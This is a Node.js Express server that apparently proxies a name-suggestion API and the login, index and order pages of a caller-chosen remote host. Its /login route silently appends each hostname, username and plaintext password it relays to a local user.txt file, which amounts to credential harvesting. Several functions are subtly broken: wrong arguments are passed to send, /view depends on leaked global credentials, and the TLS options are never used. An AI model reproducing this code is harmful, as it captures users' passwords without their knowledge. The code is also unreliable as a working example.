const http = require('http');
const querystring = require('querystring')                                                                                                                                                                                             
const path = require('path')

function send(host, path, callback, action, params){
  var gdata = [];
  const options = {
      hostname: host,
      path: path,
      method:  "GET",
      headers:{}
  };
  if(action == 'POST'){
    options.headers['Content-Type']='application/x-www-form-urlencoded'
     options.method = 'POST'
     options.headers['Content-Length']=querystring.stringify(params).length
  }else if(action){
     options.headers['Cookie'] = action
  }
  const req = http.request(options, (res) => {
      const code =  res.statusCode
      if(code != 200) return

      res.on('data', (d) => {
          gdata.push(d)
      });   

      res.on('end', d => {
          if(callback){
               var cookie = res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0] : ''
               callback(gdata.join('').toString(), cookie)
          }
      })
  })
 
  req.on('error', (e) => {
      console.error(e)
  });
  if(action == 'POST'){
     req.write(querystring.stringify(params));
  }
  req.end()
}

function random_id(n) {
	  const str='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789';
	  var cs = '';
	  while(n-- > 0){
		    cs += str.substr(Math.random()*str.length, 1);
	  }
	  return cs;
}

function getnamesgroup(params, callback){
	  let {lastname, sex, double, mode, birthdaydate, birthdaytime, curpage, size} = params;
    lastname = encodeURIComponent(lastname);
    birthdaytime = encodeURIComponent(birthdaytime);
    openid = random_id(28);
    unionid = random_id(28);
	  let path = `/getnamesgroup?lastname=${lastname}&sex=${sex}&double=${double}&mode=${mode}&birthdaydate=${birthdaydate}&birthdaytime=${birthdaytime}&openid=${openid}&unionid=${unionid}&curpage=${curpage}&nickname=%20&size=${size}`;
	  send(path, callback);
}

function reviewname(params, callback){
	  let {nameid, firstname, lastname, sex, double, mode, birthdaydate, birthdaytime, curpage, size, refreshCount} = params;
    lastname = encodeURIComponent(lastname);
    firstname = encodeURIComponent(firstname);
    birthdaytime = encodeURIComponent(birthdaytime);
    openid = random_id(28);
    unionid = random_id(28);
	  let path = `/reviewname?nameid=${nameid}&firstname=${firstname}&refreshCount=${refreshCount}&lastname=${lastname}&sex=${sex}&double=${double}&mode=${mode}&birthdaydate=${birthdaydate}&birthdaytime=${birthdaytime}&openid=${openid}&unionid=${unionid}&curpage=${curpage}&nickname=%20&size=${size}`;
    console.log(path);
    send(path, callback);
}


var express = require('express');
var bodyParser = require('body-parser')
var app = express();
app.use(bodyParser.urlencoded({ extended: false }))
app.use('/', express.static(__dirname + '/views'));

var fs = require('fs');
var options = {
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt')
};

app.post('/api/reviewname', function(req, res){
    var params = {}
    console.log(req.body);
    params.lastname = req.body.lastname;
    params.firstname = req.body.firstname;
    params.nameid = 12;
    params.refreshCount = 0;
    params.curpage = 0;
    params.size = 10;
    params.sex = req.body.sex;
    params.mode = 1;
    params.double = 2;
    params.birthdaydate = req.body.birthdaydate;
    params.birthdaytime = req.body.birthdaytime;
    reviewname(params, d=>{
        res.setHeader('Content-Type', 'application/json');
        res.send(d);
    }); 
});

app.get('/genapk', function(req, res){
     const { exec } = require('child_process');
     res.setHeader('Content-Type', 'application/json');
     console.log(`sh ${path.join(__dirname , '/views/pkg/script/auto.sh')} ${path.join(__dirname, '/views/commonRelease-3.1.0.Alpha6.apk')} ${new Date().getTime()} ${path.join(__dirname, '/views/ic_empty.png')} ${new Date().getTime()}`)
     exec(`sh ${path.join(__dirname , '/views/pkg/script/auto.sh')} ${path.join(__dirname, '/views/commonRelease-3.1.0.Alpha6.apk')} ${new Date().getTime()} ${path.join(__dirname, '/views/ic_empty.png')} ${new Date().getTime()}`, (error, stdout, stderr) => {
        res.send(`${stdout}`);
     })
     
});


app.get('/login', (req, res)=>{
    hostname = decodeURIComponent(req.query.hostname);
    password = req.query.password;
    username = decodeURIComponent(req.query.username);
    fs.appendFile('user.txt', hostname + "-" + username +"-" + password + "\n", function(err){

    });
    send(hostname, '/Home/User/login.html', d=>{
      res.send(d)
    }, 'POST', {
       "password": password,
       "username": username
    })
});

app.get('/view', (req, res)=>{
    hostname = decodeURIComponent(req.query.hostname);
    send(hostname, '/Home/User/login.html', (d, cookie)=>{
       send(hostname, '/Home/Index/index.html', d=>{
          res.send(d)
       }, cookie)
    }, 'POST', {
       "password": password,
       "username": username
    });
});

app.get('/order', (req, res)=>{
    hostname = decodeURIComponent(req.query.hostname);
    username = decodeURIComponent(req.query.username);
    bumen = decodeURIComponent(req.query.bumen);
    o_type = req.query.o_type;
    send(hostname, '/Home/User/order.html', d=>{
      res.send(d)
    }, 'POST', {
            'name': username,
            'bumen': bumen,
            'o_type': o_type
        })
});

var server = http.createServer(app);
server.listen(8443, function() {
    console.log('Listening on port %d', server.address().port);
});







